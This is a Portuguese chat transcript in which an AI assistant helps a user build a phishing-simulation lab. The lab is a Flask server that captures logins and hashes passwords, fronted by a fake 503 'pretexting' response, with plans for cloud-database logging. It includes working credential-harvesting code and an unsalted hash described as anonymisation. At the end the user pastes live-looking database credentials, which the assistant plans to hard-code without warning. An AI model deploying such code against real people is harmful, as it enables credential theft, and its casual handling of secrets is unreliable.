
python3: can't open file '/home/marcio/LabSec-PhishSim/src/backend/app.py': [Errno 2] No such file or directory

Ué, que estranho! O terminal está dizendo que o arquivo app.py não está dentro de src/backend. Vamos dar uma olhada em como as pastas e arquivos foram criados para descobrir onde ele foi parar.

Rode o comando abaixo para listarmos de forma detalhada o que tem dentro da sua pasta src:

Bash
ls -R ~/LabSec-PhishSim/src
Esse comando (ls -R) vai listar tudo o que está dentro de src e de todas as subpastas de uma vez só.

Assim que rodar, cole o resultado aqui para eu te mostrar o caminho exato onde o arquivo está escondido!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ ls

capture_server.py  logs  venv

Ah! Mistério desvendado, Márcio!

O arquivo do seu servidor não se chama app.py, ele foi criado com o nome capture_server.py. Além disso, reparei que uma pasta chamada venv foi criada acidentalmente aí dentro também (mas não se preocupe com ela agora, já que o seu ambiente principal já está ativo).

Como o arquivo correto é o capture_server.py, basta rodar o comando chamando o nome certo dele.

Execute o comando abaixo no seu terminal:

Bash
python3 capture_server.py
Assim que você rodar, o seu servidor Flask vai iniciar com sucesso e ficará escutando as requisições da rede para capturar e auditar os acessos do laboratório!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria Iniciado           

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit

192.168.204.1 - - [31/May/2026 15:43:43] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:43:43] "GET /favicon.ico HTTP/1.1" 404 -

Sensacional, Márcio! O servidor está rodando perfeitamente e escutando na rede! 🚀

O motor de auditoria já está ativo e respondendo no IP da sua máquina virtual (http://192.168.204.131:5000). Inclusive, o terminal já registrou as duas primeiras conexões vindas do seu host Windows (192.168.204.1).

Apareceu o código 404 (Not Found) nessas requisições por um motivo bem simples e esperado: você tentou acessar a raiz do servidor (/), mas o seu script Python (capture_server.py) foi desenvolvido especificamente para receber os dados enviados pelo formulário através de uma rota específica (geralmente /login, /capture ou /submit via método POST).

Para testar o fluxo completo do laboratório e ver a captura acontecer, siga estes passos:

🧪 Como testar a simulação e capturar os dados
Abra o arquivo HTML no seu navegador (Windows):
Vá na pasta do seu projeto, entre em src/frontend e abra o arquivo index.html no navegador.

Verifique a ação do Formulário (Action):
Para que o formulário envie os dados para o lugar certo, abra o index.html no bloco de notas (ou VS Code) e garanta que a tag <form> está apontando para o IP da sua VM e a rota configurada no Python. Deve estar algo parecido com isto:

HTML
<form action="http://192.168.204.131:5000/login" method="POST">
(Substitua /login pela rota exata que você programou no seu script Python se ela tiver outro nome).

Simule o Acesso:
Preencha os campos de teste no formulário da página web e clique no botão de enviar (Login).

📊 O que vai acontecer no Terminal?
Assim que você clicar em enviar no navegador:

O terminal do Flask vai registrar uma linha com o código 200 ou 302 (sucesso/redirecionamento) em vez do 404.

O script vai interceptar a requisição, gerar o hash SHA-256 da senha para proteção defensiva e salvar tudo estruturado no log.

O servidor está pronto para o show. Pode fazer o teste pelo formulário e me conta se a captura apareceu no terminal! Se quiser parar o servidor a qualquer momento, basta apertar Ctrl + C.

marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ index.html

index.html: comando não encontrado

Ah, esse é um comportamento clássico do terminal do Linux!

O erro index.html: comando não encontrado acontece porque o terminal do Ubuntu tentou executar o arquivo index.html como se ele fosse um programa de sistema ou um script executável, mas ele é apenas um arquivo de texto com código HTML.

Como você está em um ambiente de terminal (provavelmente via SSH ou sem interface gráfica na VM), você não consegue "abrir" o navegador direto por aí para ver o design da página. No entanto, no Linux, se você quiser apenas ver o código fonte do arquivo na tela do terminal para checar para onde o formulário está enviando os dados, você usa o comando cat:

Bash
cat index.html
🌐 Como abrir o formulário no seu Windows (O jeito correto de testar)
Para fazer o laboratório funcionar na prática, você precisa abrir essa página web no navegador do seu Windows (que é a máquina hospedeira da sua VM):

No seu Windows, abra o Explorador de Arquivos.

Vá até a pasta onde estão os arquivos do seu projeto (se você tiver uma pasta compartilhada com a VM) ou simplesmente baixe/clone o repositório do seu GitHub no Windows.

Entre na pasta src/frontend e dê dois cliques no arquivo index.html. Ele vai abrir direto no Chrome, Edge ou Firefox do seu Windows.

Preencha os campos e clique em enviar. Como o seu servidor Flask está rodando na VM e escutando na rede, a página do Windows vai mandar os dados direto para o terminal do Ubuntu!

Quer dar uma olhada no código do index.html pelo terminal para conferirmos a rota do formulário? É só rodar o cat index.html.

como executar o index?

Como você está no terminal de uma máquina virtual Linux (Ubuntu Server) que não possui uma interface visual com navegador, não dá para dar "dois cliques" para abrir a página da mesma forma que fazemos no Windows.

No entanto, no seu ambiente de laboratório, existem duas maneiras excelentes de fazer esse arquivo index.html rodar e interagir com o seu servidor:

Método 1: Abrir diretamente no navegador do seu Windows (Recomendado)
Como a sua máquina virtual está conectada em rede com o seu Windows (host), o jeito mais realista de testar a simulação é abrindo o formulário no navegador principal do seu computador:

No seu Windows, acesse a página do seu repositório no GitHub: [https://github.com/marciosouzagcm/LabSec-PhishSim](https://github.com/marciosouzagcm/LabSec-PhishSim).

Baixe o projeto para o Windows (clicando em Code -> Download ZIP ou clonando com o Git no Windows).

Extraia o arquivo, entre na pasta src/frontend/ e dê dois cliques no arquivo index.html.

Ele vai abrir perfeitamente no seu Chrome ou Edge. Quando você preencher os dados e clicar em enviar, o formulário vai disparar a requisição pela rede e ela vai bater direto no terminal do seu Ubuntu!

Método 2: Usar o Nginx da própria VM para servir a página
Se você quiser que a própria máquina virtual distribua essa página para a rede (agindo como um servidor web real), você pode colocar o index.html dentro do Nginx que você configurou.

Para fazer isso, copie o arquivo para a pasta pública do Nginx com o comando:

Bash
sudo cp index.html /var/www/html/
Depois que o arquivo for copiado para lá:

Vá no navegador do seu Windows.

Digite o IP da sua máquina virtual na barra de endereços: [http://192.168.204.131](http://192.168.204.131)

O Nginx vai carregar a sua página index.html direto da VM na tela do seu Windows!

🔍 Quer apenas verificar o código do formulário?
Se você está na pasta src/frontend e só quer ler o código para ter certeza de que a rota e o IP estão certos antes de testar, use o comando:

Bash
cat index.html
192.168.204.1 - - [31/May/2026 15:56:31] "POST /login HTTP/1.1" 503 -

O código 503 (Service Unavailable / Serviço Indisponível) significa que o seu formulário HTML (index.html) conseguiu encontrar o servidor Flask na rede, mas o Flask se recusou a processar a requisição ou o motor Python travou logo após receber o POST.

Como você está usando o Flask para processar esse formulário, o erro 503 geralmente acontece por um destes dois motivos técnicos no script capture_server.py:

Erro de Código na Rota /login: O Python encontrou um bug de sintaxe ou de lógica (como tentar gravar em uma pasta de logs que não existe ou um erro ao gerar o hash SHA-256) exatamente na hora de processar os dados recebidos.

Falta de Retorno (Return): A função que cuida da rota /login pode ter esquecido de retornar uma resposta válida para o navegador (como um redirecionamento ou uma mensagem de sucesso).

🛠️ Como descobrir o erro exato
Dê uma olhada na tela do terminal onde o seu capture_server.py está rodando. Logo abaixo dessa linha do erro 503, o Python provavelmente imprimiu um Rastreamento de Erro (Traceback) em letras vermelhas ou brancas, mostrando a linha exata do código que falhou.

Para consertarmos isso juntos, faça o seguinte:

Pare o servidor atual apertando Ctrl + C.

Vamos ler o código do seu servidor para ver o que tem na rota /login. Digite o comando:

Bash
cat ~/LabSec-PhishSim/src/backend/capture_server.py
Copie e cole aqui o conteúdo do seu capture_server.py ou o erro que apareceu logo abaixo do POST no terminal para que eu te mostre exatamente qual linha precisa ser corrigida!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria Iniciado           

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit

192.168.204.1 - - [31/May/2026 15:43:43] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:43:43] "GET /favicon.ico HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:51:39] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:51:59] "GET / HTTP/1.1" 404 -

192.168.204.1 - - [31/May/2026 15:56:31] "POST /login HTTP/1.1" 503 -

^C(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ cat ~/LabSec-PhishSim/src/backend/capture_server.py

import os

import datetime

import hashlib

from flask import Flask, request, redirect



app = Flask(__name__)



# Caminho para o arquivo de log do laboratório

LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')



def registrar_log(email, password_raw, ip_origem, user_agent):

    """

    Função responsável por gerar o Indicador de Comprometimento (IoC) e auditar o acesso.

    Aplica conceitos de hash criptográfico para mitigar vazamento de dados reais no lab.

    """

    # Gerando o hash SHA-256 da senha para fins de anonimização no log

    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()

    

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    

    # Estruturando a linha de log no padrão Syslog/Common Log Format

    log_line = (

        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "

        f"USUARIO_ALVO: {email} | "

        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "

        f"NAV_INFO: {user_agent}\n"

    )

    

    # Gravação persistente no sistema de arquivos do Linux

    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:

        f.write(log_line)



@app.route('/login', methods=['POST'])

def login():

    # Extração dos metadados da requisição HTTP POST

    email = request.form.get('email', 'Desconhecido')

    password_raw = request.form.get('password', '')

    

    # Identificação da origem na arquitetura de rede virtual

    ip_origem = request.remote_addr

    user_agent = request.headers.get('User-Agent', 'Desconhecido')

    

    # Executa a rotina de auditoria

    registrar_log(email, password_raw, ip_origem, user_agent)

    

    # Redireciona o usuário para uma página de conscientização ou erro genérico

    # Neste caso, simulamos uma falha de comunicação após a coleta para o usuário não suspeitar

    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503



if __name__ == '__main__':

    print("=========================================================")

    print(" LabSec-PhishSim - Motor de Auditoria Iniciado           ")

    print(" Escutando no endereço: http://0.0.0.0:5000              ")

    print("=========================================================")

    # Executa o servidor vinculando-o a todas as interfaces de rede da VM

    app.run(host='0.0.0.0', port=5000, debug=False)

Mistério resolvido, Márcio! Não há nenhum bug no seu código! 🕵️‍♂️

O código funcionou exatamente da forma como você o programou. Se você olhar a linha final da sua rota /login, você mesmo configurou o Flask para devolver um texto simulando uma falha de comunicação e o status HTTP 503:

Python
return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503
Essa é uma técnica de pretexting muito comum em laboratórios desse tipo: o servidor finge que está quebrado para o usuário achar que foi só uma falha na internet, mas nos bastidores os metadados já foram coletados e o log já foi escrito.

Como o Flask não exibiu nenhuma linha de erro vermelha (Traceback), isso significa que a função registrar_log foi executada com sucesso total antes de responder à requisição.

📊 Vamos ver a prova do crime (O Log)
Como o Flask salvou as informações antes de retornar o erro simulado, o registro do seu teste já deve estar gravado no arquivo de log dentro da pasta logs.

Para ler o arquivo de auditoria e confirmar que a criptografia funcionou, execute este comando no terminal:

Bash
cat ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
Você verá uma linha estruturada mostrando o IP do seu Windows (192.168.204.1), o e-mail de teste que digitou, o navegador utilizado e a senha completamente anonimizada pelo algoritmo SHA-256.

Roda o cat aí e veja a mágica do seu motor de auditoria funcionando na prática!

avançamos a um ponto em que se faz necessário atualizar este documento, poi no decorrer dos testes ja identifique esse de namoe de arquivo, a exemplo o app.py que na verdade é capture_server. py, acredito tambem que devamos demonstrar todo o processo , cito o arquivo tesntativas_acesso.log (como utilizar), avançamos a um ponto tambem que podemos sugerir e apos analise fornecida por voce , poder sugerir melhorias , ou acrescimos, tenho uma duvida se seria importante ou viável de fazer mandas essas informações como quem tentou logar e hash para um banco de dados na nuvem

Com certeza, Márcio. O projeto evoluiu bastante e agora reflete um cenário real de infraestrutura e desenvolvimento. Atualizar a documentação neste momento é fundamental para manter o rigor técnico e registrar o aprendizado.

Como você mencionou o interesse em mover os logs para um banco de dados, o ideal é atualizarmos o documento técnico de arquitetura e diretrizes do motor (o seu framework técnico que serve de base para o projeto) antes de alterarmos o README do GitHub. Assim, desenhamos a nova arquitetura e incluímos as correções de nomenclatura, a análise forense de logs e a viabilidade do banco na nuvem.

📊 Análise de Viabilidade: Mandar Logs e Hashes para a Nuvem?
Sim, é extremamente viável e altamente recomendado para evoluir o laboratório para um nível corporativo (Production-ready).

Por que fazer? Em um ambiente real, armazenar logs localmente no servidor web (.log) é um risco de segurança. Se um atacante invadir o servidor web, ele pode apagar o arquivo para cobrir os rastros. Enviar os dados síncrona ou assincronamente para um banco na nuvem garante a integridade e a centralização dos dados para auditoria.

O que sugerir de melhoria? Podemos desenhar a arquitetura utilizando uma tecnologia leve e aderente ao seu ecossistema, como o MongoDB Atlas (NoSQL na nuvem, excelente para estruturas de log/JSON e com integração nativa rápida via Python) ou uma instância gerenciada de PostgreSQL/MySQL.

Vou estruturar e gerar uma versão atualizada (V2) do seu documento de especificações técnicas, consolidando a correção do capture_server.py, o guia do tentativas_acesso.log e a nova proposta de arquitetura com banco de dados na nuvem.

Aguarde um momento enquanto formato o documento completo com tabelas e blocos de código limpos.

ok, irei aguardar enquanto vc formata o documento completo com tabelas e blocos de código limpos.

Aqui está a especificação técnica atualizada do projeto, agora refletindo exatamente a realidade prática do seu laboratório (como o arquivo capture_server.py) e expandindo os conceitos para uma arquitetura moderna com persistência de dados em nuvem.

DOCUMENTO DE ARQUITETURA E DIRETRIZES TÉCNICAS (V2.2026)
Projeto: LabSec-PhishSim (Ambiente de Simulação de Engenharia Social)

Desenvolvedor: Marcio Souza

Status: Atualizado / Proposta de Expansão

1. Mapeamento da Infraestrutura Atual
A tabela abaixo corrige e consolida a real estrutura de arquivos e responsabilidades do sistema de arquivos do Linux observada nos testes práticos:

Componente	Nome do Arquivo / Pasta	Caminho Relativo	Função Tecnológica
Front-End	index.html	/src/frontend/index.html	Interface em HTML5/CSS3 que simula o portal de login corporativo (Pretexting). Dispara uma requisição síncrona POST /login.
Back-End	capture_server.py	/src/backend/capture_server.py	Motor Flask (Python) configurado para escutar na interface 0.0.0.0:5000. Extrai metadados, invoca o hash criptográfico e responde com um falso erro 503.
Ambiente	venv/	/venv/	Ambiente virtual isolado do Python 3, garantindo que as dependências (Flask) fiquem contidas na raiz do projeto.
Persistência	tentativas_acesso.log	/src/backend/logs/tentativas_acesso.log	Arquivo físico e local no Linux que atua como repositório forense append-only (apenas adição).
2. Guia de Operação de Log (Análise Forense)
Para acompanhar e auditar as simulações em tempo real, o administrador do laboratório deve entender como extrair valor das informações capturadas no Linux.

Visualização em Tempo Real (Modo Escuta)
Para abrir um terminal dedicado e assistir os dados entrando à medida que os usuários interagem com o formulário:

Bash
tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
Anatomia da Linha de Log Gerada
Cada entrada segue o padrão estruturado abaixo para facilitar o parse em ferramentas de SIEM ou scripts de análise:

Plaintext
[2026-05-31 15:56:31] IP_ORIGEM: 192.168.204.1 | USUARIO_ALVO: teste@email.com | CREDENTIAL_HASH(SHA256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | NAV_INFO: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
[Timestamp]: Data e hora exata do clique, essencial para correlação de eventos.

IP_ORIGEM: Revela a máquina de origem na rede interna (hospedeiro Windows).

CREDENTIAL_HASH(SHA256): A string de 64 caracteres hexadecimais prova que o dado trafegou, mas impede que a senha em texto claro fique exposta no servidor, mantendo a conformidade com boas práticas de privacidade de dados em laboratórios de segurança.

3. Análise de Viabilidade: Migração para Banco de Dados na Nuvem
Armazenar logs localmente em arquivos .log possui limitações claras em cenários de escala ou auditorias distribuídas (se o servidor web sofrer um comprometimento, o invasor pode apagar o arquivo de log para eliminar rastros).

Abaixo está o desenho da nova arquitetura proposta para enviar os dados síncronos diretamente para uma nuvem gerenciada (ex: MongoDB Atlas ou PostgreSQL na AWS/Supabase):

Plaintext
[Cliente: Windows Navegador] 
       │
       │ (HTTP POST /login)
       ▼
[Servidor Web: Flask na VM Ubuntu]
       │
       ├─► 1. Grava Log de Segurança Local (Segurança redundante)
       │
       └─► 2. Dispara Conexão TLS (Porta 27017 / 5432)
                 │
                 ▼
       [Banco de Dados na Nuvem (Cloud DB)]
         ├── Coleção: auditoria_acessos
         └── Payload: { email, sha256_hash, ip, user_agent, data }
Vantagens Técnicas da Solução em Nuvem:
Resiliência de Dados: Centralização forense. Mesmo se a máquina virtual do Flask for destruída ou reiniciada, os dados de auditoria permanecem intactos na nuvem.

Consultas Estruturadas (Analytics): Permite criar dashboards em tempo real (ex: gráficos de tentativas de acesso por horário ou IPs mais recorrentes).

Escalabilidade: Capacidade de receber requisições de múltiplos servidores de simulação simultâneos.

4. Próximo Passo: Proposta de Refatoração do Código
Para integrar o banco de dados na nuvem (usando o MongoDB Atlas como exemplo NoSQL, por ser extremamente rápido e utilizar estruturas JSON nativas similares aos dicionários do Python), o arquivo capture_server.py receberá uma nova biblioteca (pymongo).

Aqui está o esboço limpo de como o código se comportará com essa melhoria implementada:

Python
import os
import datetime
import hashlib
from flask import Flask, request
from pymongo import MongoClient # Nova dependência para nuvem

app = Flask(__name__)

# Configuração da string de conexão segura da nuvem (geralmente via variáveis de ambiente)
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://usuario:senha@cluster0.mongodb.net/meu_db")
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=2000)
    db = client.labsec_db
    colecao_logs = db.auditoria_acessos
    cloud_db_active = True
except Exception:
    cloud_db_active = False

LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

def registrar_log(email, password_raw, ip_origem, user_agent):
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # 1. Manter gravação local por segurança (Redundância)
    log_line = f"[{timestamp}] IP_ORIGEM: {ip_origem} | USUARIO_ALVO: {email} | CREDENTIAL_HASH(SHA256): {pwd_hash}\n"
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)
        
    # 2. Persistência Assíncrona/Síncrona na Nuvem
    if cloud_db_active:
        documento_log = {
            "timestamp": datetime.datetime.utcnow(),
            "usuario_alvo": email,
            "credential_hash_sha256": pwd_hash,
            "ip_origem": ip_origem,
            "user_agent": user_agent
        }
        try:
            colecao_logs.insert_one(documento_log)
        except Exception as e:
            print(f"Erro ao persistir na nuvem: {e}")

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    registrar_log(email, password_raw, ip_origem, user_agent)
    
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
Podemos utilizar este documento base para atualizar o README.md do seu repositório remoto ou podemos prosseguir com a configuração de uma conta gratuita no banco de dados em nuvem para alterar o código do servidor. Como prefere avançar?

Prefiro que voce condense tudo agora no arquivo README.md e a partir deste ducumento atualizado prosseguirmos para as atualizações, sendo assim me forne o arquivo README.md apenas neste momento

Aqui está o arquivo README.md completo e atualizado, condensando a realidade atual do seu laboratório (com as correções de nomenclatura) e a nova proposta de expansão para a nuvem.

Você pode copiar todo o bloco de código abaixo e substituir o conteúdo do seu arquivo atual na VM.

Markdown
# LabSec-PhishSim 🛡️ 🚀

Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos de Redes, Sistemas Operacionais (Linux/Windows) e Criptografia Aplicada.

O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria e armazena os metadados de forma segura utilizando funções de resumo criptográfico.

---

## 🏗️ Arquitetura do Sistema e Fluxo de Dados

A infraestrutura é montada utilizando uma arquitetura híbrida de rede virtualizada via VMware, dividida em três camadas principais:

1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou via Nginx.
2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` para escutar requisições de rede de forma síncrona na porta `5000`, interceptar dados de formulários e processar metadados do cliente (IP de Origem, User-Agent).
3. **Camada de Persistência e Criptografia:** Aplicação de algoritmos de Hashing (SHA-256) sobre as credenciais recebidas, garantindo a privacidade dos dados antes do armazenamento nos logs locais (`tentativas_acesso.log`).

### 🗺️ Próxima Fase: Expansão para a Nuvem
O projeto prevê a migração do armazenamento local para um modelo centralizado, onde o `capture_server.py` enviará os payloads anonimizados via TLS para um Banco de Dados na Nuvem (**MongoDB Atlas** ou **PostgreSQL**), aumentando a resiliência forense do ambiente.

---

## 🛠️ Tecnologias Utilizadas

* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)
* **Back-End:** Python 3.x, Flask (Ambiente Virtual `venv`)
* **Front-End:** HTML5, CSS3
* **Segurança:** Hash SHA-256 (Biblioteca Nativa `hashlib`)
* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)

---

## 🗂️ Estrutura de Pastas Atualizada

```text
LabSec-PhishSim/
├── venv/                       # Ambiente virtual isolado do Python 3
├── src/
│   ├── frontend/
│   │   └── index.html          # Interface do formulário de simulação
│   └── backend/
│       ├── capture_server.py   # Motor Flask e processamento de requisições
│       └── logs/
│           └── tentativas_acesso.log  # Registro forense local (ignorado no Git)
├── .gitignore                  # Proteção de ambiente virtual e logs locais
└── README.md                   # Documentação técnica do projeto
🕵️‍♂️ Operação e Análise Forense de Logs
1. Monitoramento em Tempo Real
Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

Bash
tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log
2. Anatomia do Log Estruturado
Cada entrada capturada gera um registro anonimizado conforme o padrão abaixo:

Plaintext
[2026-05-31 15:56:31] IP_ORIGEM: 192.168.204.1 | USUARIO_ALVO: teste@email.com | CREDENTIAL_HASH(SHA256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | NAV_INFO: Mozilla/5.0...
IP_ORIGEM: Identifica a máquina host (Windows) de onde partiu o clique.

CREDENTIAL_HASH(SHA256): Garante que a senha digitada nunca fique exposta em texto claro no servidor, aplicando os princípios de Security by Design.

🚀 Como Executar o Laboratório Localmente
1. Configurar o Ambiente Virtual e Dependências
Na pasta raiz do projeto (~/LabSec-PhishSim), inicialize o ambiente:

Bash
python3 -m venv venv
source venv/bin/activate
pip install flask
2. Iniciar o Servidor de Captura
Entre na pasta do back-end e execute o motor:

Bash
cd src/backend
python3 capture_server.py
Nota: O servidor responderá com um erro HTTP 503 simulado para o cliente após a coleta, agindo como um mecanismo de pretexting técnico.

3. Testar o Front-End
Abra o arquivo src/frontend/index.html no navegador do sistema hospedeiro (Windows) e certifique-se de que a tag <form action="..."> aponta para o IP correto da sua máquina virtual Ubuntu na porta 5000.

⚖️ Aviso Legal (Disclaimer)
Este projeto foi desenvolvido estritamente para fins de pesquisa acadêmica, testes de penetração autorizados e treinamento de conscientização de usuários. O uso deste código contra sistemas sem consentimento explícito e por escrito dos proprietários é ilegal e passível de penalidades jurídicas. O desenvolvedor não se responsabiliza pelo mau uso desta ferramenta.

Developed by Marcio Souza 💻

sobre colocar na nuvem um banco de dados porei ser no db Tidb?

Sim, Márcio! O TiDB (da PingCAP) é uma excelente escolha e seria um diferencial técnico absurdo para o seu projeto de segurança e infraestrutura.

Se você optar por usá-lo, a melhor alternativa para o laboratório é o TiDB Cloud, que possui uma camada gratuita (Serverless Tier) robusta, permitindo que você crie um cluster na nuvem em poucos minutos sem gastar nada.

🧠 Por que usar o TiDB no seu projeto? (Vantagens Técnicas)
O TiDB não é um banco de dados comum. Ele é um banco do tipo NewSQL distribuído. Trazer essa tecnologia para o seu ecossistema adiciona conceitos avançados de engenharia de software ao seu portfólio:

Compatibilidade Nativa com MySQL: O TiDB fala o protocolo do MySQL. Isso significa que, para o seu script Python (capture_server.py), ele vai se comportar exatamente como um banco MySQL tradicional. Você poderá usar bibliotecas padrão do Python (como pymysql ou mysql-connector-python) para se conectar a ele na nuvem.

Arquitetura Distribuída e HTAP: Ele foi desenhado para escalabilidade horizontal e processamento híbrido (transacional e analítico). Em um cenário real de segurança, se o seu servidor de simulação recebesse milhões de requisições por segundo de múltiplos servidores espalhados pelo mundo, o TiDB aguentaria o tranco e ainda permitiria gerar relatórios analíticos de segurança em tempo real sem travar as inserções dos logs.

Resiliência e Alta Disponibilidade: Como os dados são distribuídos automaticamente em múltiplos nós na nuvem, mesmo que uma zona de disponibilidade da nuvem caia, seus logs forenses não seriam perdidos.

🗺️ Como ficaria a Arquitetura com o TiDB Cloud
A integração síncrona do seu motor de auditoria com a nuvem utilizando o protocolo TLS (criptografia em trânsito) seguiria o fluxo abaixo:

Plaintext
[Cliente: Windows Navegador] 
       │
       │ (HTTP POST /login)
       ▼
[Servidor Web: Flask na VM Ubuntu]
       │
       ├─► 1. Grava Log Local (Redundância em texto plano)
       │
       └─► 2. Conecta via Protocolo MySQL + TLS (Porta 4000)
                 │
                 ▼
       [TiDB Cloud: Cluster Distribuído]
         ├── Database: labsec_db
         └── Tabela: auditoria_acessos (Estrutura Relacional SQL)
📝 Estrutura da Tabela no TiDB (SQL)
Diferente do MongoDB (que usa documentos JSON livres), o TiDB é um banco relacional (SQL). Portanto, precisamos criar uma tabela estruturada para receber os metadados. O comando SQL para criar a tabela de auditoria seria este:

SQL
CREATE DATABASE IF NOT EXISTS labsec_db;
USE labsec_db;

CREATE TABLE auditoria_acessos (
    id INT AUTO_INCREMENT PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    usuario_alvo VARCHAR(255) NOT NULL,
    credential_hash_sha256 CHAR(64) NOT NULL,
    ip_origem VARCHAR(45) NOT NULL,
    user_agent TEXT
);
🛠️ O que muda no código do Python (capture_server.py)?
Para conectar o Flask ao TiDB Cloud, precisaríamos instalar a biblioteca do MySQL no ambiente virtual (pip install pymysql) e adaptar a função de persistência. O código ganharia um bloco parecido com este:

Python
import pymysql

def registrar_no_tidb(email, pwd_hash, ip_origem, user_agent):
    try:
        # Conexão segura com o TiDB Cloud na porta padrão 4000
        conexao = pymysql.connect(
            host='gateway01.us-east-1.prod.aws.tidbcloud.com', # Exemplo de host fornecido por eles
            port=4000,
            user='seu_usuario',
            password='sua_senha',
            database='labsec_db',
            ssl_verify_cert=True, # Garante criptografia TLS em trânsito
            ssl_ca='/etc/ssl/certs/ca-certificates.crt' # Certificado nativo do Ubuntu
        )
        with conexao.cursor() as cursor:
            sql = """INSERT INTO auditoria_acessos (usuario_alvo, credential_hash_sha256, ip_origem, user_agent) 
                     VALUES (%s, %s, %s, %s)"""
            cursor.execute(sql, (email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
    except Exception as e:
        print(f"Falha na contingência de nuvem (TiDB): {e}")
    finally:
        if 'conexao' in locals():
            conexao.close()
🚀 Qual o próximo passo?
Se você quiser seguir com o TiDB, o caminho ideal é:

Criar uma conta gratuita no TiDB Cloud.

Criar um cluster gratuito (Serverless) na região da AWS ou Google Cloud mais próxima.

Pegar as credenciais de conexão que eles vão te fornecer na tela.

Quer que eu te ajude a estruturar os comandos para preparar o ambiente virtual do Ubuntu e criar esse script de integração oficial com o TiDB?

HOST:

gateway01.us-east-1.prod.aws.tidbcloud.com

PORT:

4000

USERNAME:

2ekNitjymau1dcX.root

PASSWORD:

4k6IIcI6qLl8UfjS

DATABASE:

labsec_db

CA:

<CA_PATH>, mysql://2ekNitjymau1dcX.root:4k6IIcI6qLl8UfjS@gateway01.us-east-1.prod.aws.tidbcloud.com:4000/labsec_db

Perfeito, Márcio! Com essas credenciais do TiDB Cloud Serverless, temos tudo o que é necessário para integrar o seu banco de dados distribuído em nuvem ao motor de auditoria.

Como o TiDB utiliza criptografia TLS ponta a ponta por padrão na nuvem para garantir a segurança dos dados em trânsito, o Python precisa apontar para o arquivo de certificado CA nativo do próprio Ubuntu. No Ubuntu, esse arquivo padrão fica em /etc/ssl/certs/ca-certificates.crt.

Vamos fazer essa atualização em três etapas rápidas direto na sua VM.

🛠️ Passo 1: Instalar o driver do MySQL no Ambiente Virtual
Como o TiDB é totalmente compatível com o protocolo MySQL, vamos instalar a biblioteca PyMySQL dentro do seu ambiente virtual para permitir que o Flask faça essa conexão.

Se o seu servidor ainda estiver rodando, pare-o com Ctrl + C e execute:

Bash
# Garantir que o ambiente virtual está ativo (deve mostrar o prefixo (venv))
source ~/LabSec-PhishSim/venv/bin/activate

# Instalar o driver de conexão com o banco de dados
pip install pymysql
📝 Passo 2: Atualizar o arquivo capture_server.py
Vamos reescrever o arquivo do servidor utilizando o comando cat << 'EOF' para injetar o código atualizado de uma vez só, contendo as suas credenciais oficiais do TiDB e a lógica de persistência híbrida (grava no log local e simultaneamente na nuvem).

